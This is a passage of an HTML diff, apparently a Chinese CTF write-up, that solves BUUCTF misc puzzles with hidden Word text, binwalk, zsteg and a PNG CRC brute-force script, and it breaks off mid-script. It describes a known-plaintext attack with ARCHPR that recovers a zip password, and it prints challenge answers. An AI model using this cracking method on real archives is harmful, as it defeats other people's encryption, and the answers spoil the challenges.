+&lt;p&gt;word显示隐藏文本:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#点击word左上角的“文件”，进入后台试图，点击“更多”,点击“选项”，会打开“Word选项”对话框，在“显示”&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#里勾选“隐藏文字”，意思是显示word中的隐藏文字，确定即可。此时word里有隐藏效果的文本下面会有一条&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#虚线，当你打印的时候这些隐藏效果的文本是不存在的。&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;图片隐写：使用 zsteg 解密&lt;/p&gt;
+&lt;h3 id=&#34;font-colora020f0题目分析font-8&#34;&gt;&lt;font color=#A020F0&gt;题目分析&lt;/font&gt;&lt;/h3&gt;
+&lt;p&gt;下载文件为压缩包，伪加密。可以使用&lt;strong&gt;360压缩&lt;/strong&gt;直接解压(可以无视伪加密)，或者在&lt;strong&gt;kali2021版中使用 binwalk&lt;/strong&gt; 提取文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#binwalk 提取文件命令&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;binwalk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;xxx&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;zip&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210701101905430.png&#34; alt=&#34;image-20210701101905430&#34;&gt;&lt;/p&gt;
+&lt;p&gt;得到文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;Anime_Intro&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;doc&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;zip&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;打开 Anime_Intro.doc 这里，我的word开启了显示隐藏文字的，经常做杂项的应该会开启。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#隐藏的文本&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;Hello&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;everyone&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;I&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;am&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Gilbert&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Everyone&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;thought&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;that&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;I&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;was&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;killed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;but&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;actually&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;I&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;survived&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Now&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;that&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;I&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;have&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;no&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cash&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;me&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;I&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;’&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;trapped&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;another&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;country&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;I&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;can&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;t contact Violet now. She must be desperate to see me and I don&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;want&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;her&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cry&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;me&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;I&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;need&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pay&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;300&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;train&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;88&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;meal&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Cash&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;battlenet&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;point&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;are&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;both&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;accepted&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;I&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;don&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;t play the Hearthstone, and I don&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;even&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;know&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;what&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Rastakhan&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;s Rumble.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;flag.zip文件需要解压密码&lt;/p&gt;
+&lt;p&gt;flag.zip中我们可以看到里面也有一份文本文件，通过题目的提示（BUU这里没写）&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;err&#34;&gt;提示：&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;The&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;txt&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;GBK&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;encoding&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;我们可以知道这里可以利用zip明文攻击，将得到的隐藏文本进行 gbk 编码后，用WINRAR压缩成 .zip 文件。&lt;/p&gt;
+&lt;p&gt;因为 flag.zip 是用WINRAR压缩的，所有我们的 test.txt文件也要采用一样的压缩方式。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210701104621712.png&#34; alt=&#34;image-20210701104621712&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;将隐藏文件写入文本，另存为时编码格式采用 ANSI (包含GBK)&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210701104812901.png&#34; alt=&#34;image-20210701104812901&#34;&gt;&lt;/p&gt;
+&lt;p&gt;压缩后对比 test.zip 和 last words.txt 文件的CRC值一样。用 ARCHPR进行明文攻击。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210701105423775.png&#34; alt=&#34;image-20210701105423775&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210701105432180.png&#34; alt=&#34;image-20210701105432180&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210701105905155.png&#34; alt=&#34;image-20210701105905155&#34;&gt;&lt;/p&gt;
+&lt;p&gt;利用口令My_waifu 解压 flag.zip 后得到 ：flag.png 查看了属性3.41M，感觉里面应该进行了数据隐写。&lt;/p&gt;
+&lt;p&gt;直接用 &lt;font color=#A020F0&gt;&lt;code&gt;图片隐写信息快速检测工具——zsteg&lt;/code&gt;&lt;/font&gt;，(How to use? Google)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210701110907614.png&#34; alt=&#34;image-20210701110907614&#34;&gt;&lt;/p&gt;
+&lt;p&gt;*&lt;strong&gt;ctf{vI0l3t_Ev3rg@RdeN}&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;font-color0288d1湖南省赛2019findmefont&#34;&gt;&lt;font color=#0288D1&gt;【湖南省赛2019】Findme&lt;/font&gt;&lt;/h2&gt;
+&lt;h3 id=&#34;font-colora020f0知识点png格式信息tweakpngcrc修复宽和高crc隐写font&#34;&gt;&lt;font color=#A020F0&gt;知识点：PNG格式信息，TweakPNG，CRC修复宽和高，CRC隐写&lt;/font&gt;&lt;/h3&gt;
+&lt;p&gt;学习：&lt;a href=&#34;https://blog.mythsman.com/post/5d2d62b4a2005d74040ef7eb/&#34;&gt;&lt;font color=#0288D1&gt;PNG文件格式详解&lt;/font&gt;&lt;/a&gt; 了解PNG的文件格式&lt;/p&gt;
+&lt;p&gt;使用python脚本 ：CRC修复宽和高的脚本&lt;/p&gt;
+&lt;p&gt;在CRC处隐写16进制信息&lt;/p&gt;
+&lt;p&gt;分析PNG ,数据CHUNK信息&lt;/p&gt;
+&lt;h3 id=&#34;font-colora020f0题目分析font-9&#34;&gt;&lt;font color=#A020F0&gt;题目分析&lt;/font&gt;&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;压缩包中有5张图，一张张来分析&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id=&#34;第一张图-1png&#34;&gt;第一张图 1.png&lt;/h4&gt;
+&lt;p&gt;用TweakPNG打开，提示IHDR部分的CRC值不正确，在看图片我们可以知道应该是图片的高宽被篡改了。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210701145159232.png&#34; alt=&#34;image-20210701145159232&#34;&gt;&lt;/p&gt;
+&lt;p&gt;使用pyhton脚本通过CRC修复图片的宽和高：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;sys&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;chdir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;zlib&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;struct&lt;/span&gt;
+ 
+&lt;span class=&#34;n&#34;&gt;filename&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;1.png&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;all_b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;crc32key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;all_b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;29&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bytearray&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;all_b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;29&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4095&lt;/span&gt;            &lt;span class=&#34;c1&#34;&gt;#理论上0xffffffff,但考虑到屏幕实际/cpu，0x0fff就差不多了&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;w&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;#高和宽一起爆破&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;width&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bytearray&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;struct&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt;i&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;     &lt;span class=&#34;c1&#34;&gt;#q为8字节，i为4字节，h为2字节&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;h&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+            &lt;span class=&#34;n&#34;&gt;height&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bytearray&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;struct&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt;i&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+            &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+                &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;width&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+                &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+            &lt;span class=&#34;n&#34;&gt;crc32result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;zlib&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;crc32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;crc32result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;crc32key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+                &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;宽为：&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+                &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;width&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+                &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;高为：&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
